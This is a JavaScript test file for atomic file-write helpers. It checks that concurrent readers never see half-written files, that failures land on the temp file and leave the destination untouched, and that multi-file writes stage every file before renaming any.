/**
 * Observing TEARING, not its absence. Two writers alternate two documents of
 * very different size on one path while this process reads in a loop: without
 * temp+rename the reader catches the file between truncate and refill. The
 * previous version of this test asserted "two files exist with the final
 * content", which a plain writeFileSync satisfies *better* (no temp file at
 * all) — it could not kill the mutant.
 */
test('atomic writes: a concurrent reader never observes a half-written document', async () => {
  const out = dir();
  const target = join(out, STATE_FILE);
  const big = GENERATED_HEAD + 'B'.repeat(2_000_000) + '\n';
  const small = GENERATED_HEAD + 'S'.repeat(64) + '\n';
  writeFileSync(target, small);

  const writer = (fill, len, iters) =>
    new Promise((res, rej) => {
      const code = `
        import { writeAtomic } from ${JSON.stringify(SCRIPT)};
        const body = process.env.HEAD + process.env.FILL.repeat(Number(process.env.LEN)) + '\\n';
        for (let i = 0; i < Number(process.env.ITERS); i++) writeAtomic(process.env.TARGET, body);
      `;
      const p = spawn(process.execPath, ['--input-type=module', '-e', code], {
        env: { ...process.env, TARGET: target, HEAD: GENERATED_HEAD, FILL: fill, LEN: String(len), ITERS: String(iters) },
      });
      let err = '';
      p.stderr.on('data', (c) => (err += c));
      p.on('close', (c) => (c === 0 ? res() : rej(new Error(`writer exit ${c}: ${err}`))));
    });

  let done = false;
  const writers = Promise.all([writer('B', 2_000_000, 25), writer('S', 64, 25)]).then(() => (done = true));

  let reads = 0;
  const torn = [];
  const seen = new Set();
  while (!done) {
    let raw;
    try {
      raw = readFileSync(target, 'utf8');
    } catch {
      continue; // ENOENT is impossible with rename, but never fail on the read itself
    }
    reads++;
    if (raw !== big && raw !== small) {
      torn.push(`len=${raw.length} head=${JSON.stringify(raw.slice(0, 20))} tail=${JSON.stringify(raw.slice(-3))}`);
    } else seen.add(raw.length);
    if (reads % 200 === 0) await new Promise((r) => setImmediate(r));
  }
  await writers;

  assert.ok(reads > 50, `reader did not observe the writers (only ${reads} reads)`);
  assert.deepEqual(torn.slice(0, 3), [], `torn reads: ${torn.length}/${reads}`);
  assert.equal(torn.length, 0);
  // vacuity guard: the reader must have seen the file actually change
  assert.equal(seen.size, 2, `reader only ever saw ${[...seen]} — it never raced a write`);
});

test('atomic writes: a failure hits the temp file, never the destination', (t) => {
  if (typeof process.getuid === 'function' && process.getuid() === 0) {
    t.skip('running as root: permissions are not enforced');
    return;
  }
  const out = dir();
  const target = join(out, STATE_FILE);
  writeFileSync(target, 'PREVIOUS PROJECTION\n');
  chmodSync(out, 0o500); // read + execute, no write
  let caught;
  try {
    writeAtomic(target, 'NEW CONTENT\n');
  } catch (err) {
    caught = err;
  } finally {
    chmodSync(out, 0o700);
  }
  assert.ok(caught, 'writeAtomic silently succeeded in a read-only directory');
  assert.equal(caught.code, 'EACCES');
  assert.match(caught.path ?? '', /\.tmp$/, `failure path was ${caught.path}, expected the temp file`);
  assert.equal(readFileSync(target, 'utf8'), 'PREVIOUS PROJECTION\n'); // untouched
  assert.deepEqual(readdirSync(out), [STATE_FILE]); // no temp left behind
});

test('writeAllAtomic: an unwritable directory fails before touching anything', (t) => {
  // NOTE: this does NOT prove staging-before-rename — the FIRST write already
  // fails here, so no rename happens in either the correct or the broken
  // implementation. The test below is the one that pins the ordering.
  if (typeof process.getuid === 'function' && process.getuid() === 0) {
    t.skip('running as root: permissions are not enforced');
    return;
  }
  const out = dir();
  writeFileSync(join(out, STATE_FILE), 'OLD STATE\n');
  writeFileSync(join(out, PROGRESS_FILE), 'OLD PROGRESS\n');
  chmodSync(out, 0o500);
  try {
    assert.throws(() =>
      writeAllAtomic([
        [join(out, STATE_FILE), 'NEW STATE\n'],
        [join(out, PROGRESS_FILE), 'NEW PROGRESS\n'],
      ]),
    );
  } finally {
    chmodSync(out, 0o700);
  }
  assert.equal(readFileSync(join(out, STATE_FILE), 'utf8'), 'OLD STATE\n');
  assert.equal(readFileSync(join(out, PROGRESS_FILE), 'utf8'), 'OLD PROGRESS\n');
  assert.deepEqual(readdirSync(out).sort(), [PROGRESS_FILE, STATE_FILE].sort());
});

test('writeAllAtomic stages EVERY file before renaming any of them', () => {
  // The first entry stages fine; the second cannot even be staged (its
  // directory does not exist). A rename-as-you-go implementation would have
  // already swapped STATE.md by then — this is what pins the ordering.
  const out = dir();
  writeFileSync(join(out, STATE_FILE), 'OLD STATE\n');
  assert.throws(() =>
    writeAllAtomic([
      [join(out, STATE_FILE), 'NEW STATE\n'],
      [join(out, 'no-such-dir', PROGRESS_FILE), 'NEW PROGRESS\n'],
    ]),
  );
  assert.equal(
    readFileSync(join(out, STATE_FILE), 'utf8'),
    'OLD STATE\n',
    'STATE.md was swapped before the whole set could be staged',
  );
  assert.deepEqual(readdirSync(out), [STATE_FILE], 'a temp file was left behind');
});

test('writeAllAtomic leaves no orphaned .tmp when a RENAME fails', () => {
  // Staging succeeds for both; the second rename then fails because the
  // destination path is a non-empty directory. The already-renamed first file
  // stays swapped (documented window) — but nothing may be left on disk.
  const out = dir();
  const blocked = join(out, PROGRESS_FILE);
  mkdirSync(blocked);
  writeFileSync(join(blocked, 'occupant'), 'x'); // rename onto it must fail
  writeFileSync(join(out, STATE_FILE), 'OLD STATE\n');

  assert.throws(() =>
    writeAllAtomic([
      [join(out, STATE_FILE), 'NEW STATE\n'],
      [blocked, 'NEW PROGRESS\n'],
    ]),
  );
  const leftovers = readdirSync(out).filter((f) => f.endsWith('.tmp'));
  assert.deepEqual(leftovers, [], `orphaned temp files: ${leftovers}`);
});
